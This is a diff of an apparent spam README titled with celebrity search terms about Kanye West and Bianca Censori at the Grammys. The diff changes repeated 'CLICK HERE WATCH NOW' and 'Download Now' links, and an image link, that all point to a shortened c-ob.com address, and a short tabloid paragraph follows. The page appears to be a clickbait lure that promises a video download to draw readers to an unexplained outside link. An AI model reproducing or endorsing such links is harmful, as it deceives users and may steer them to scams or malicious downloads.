@@ -1,14 +1,14 @@
 # Full-Bianca-Censori-Grammy-Kanye-West-And-Bianca-Censori-Kanye-West-And-Bianca-Grammys
-🌐 [CLICK HERE 🟢==►► WATCH NOW](http://c-ob.com/g8ao95/GITHUB)
+🌐 [CLICK HERE 🟢==►► WATCH NOW](http://c-ob.com/g8ao95)
 
-🔴 [CLICK HERE 🌐==►► Download Now](http://c-ob.com/g8ao95/GITHUB)
+🔴 [CLICK HERE 🌐==►► Download Now](http://c-ob.com/g8ao95)
 
-🌐 [CLICK HERE 🟢==►► WATCH NOW](http://c-ob.com/g8ao95/GITHUB)
+🌐 [CLICK HERE 🟢==►► WATCH NOW](http://c-ob.com/g8ao95)
 
-🔴 [CLICK HERE 🌐==►► Download Now](http://c-ob.com/g8ao95/GITHUB)
+🔴 [CLICK HERE 🌐==►► Download Now](http://c-ob.com/g8ao95)
 
 
-[<img src="https://i.imgur.com/5ezlWg9.png">](http://c-ob.com/g8ao95/GITHUB)
+[<img src="https://i.imgur.com/5ezlWg9.png">](http://c-ob.com/g8ao95)
 
 Kanye West's chilling words to wife Bianca Censori before she bared all on the Grammys red carpet have been revealed. The pair shocked the world on Sunday night when model and designer Bianca dropped her coat to expose her body in nude mesh.
 
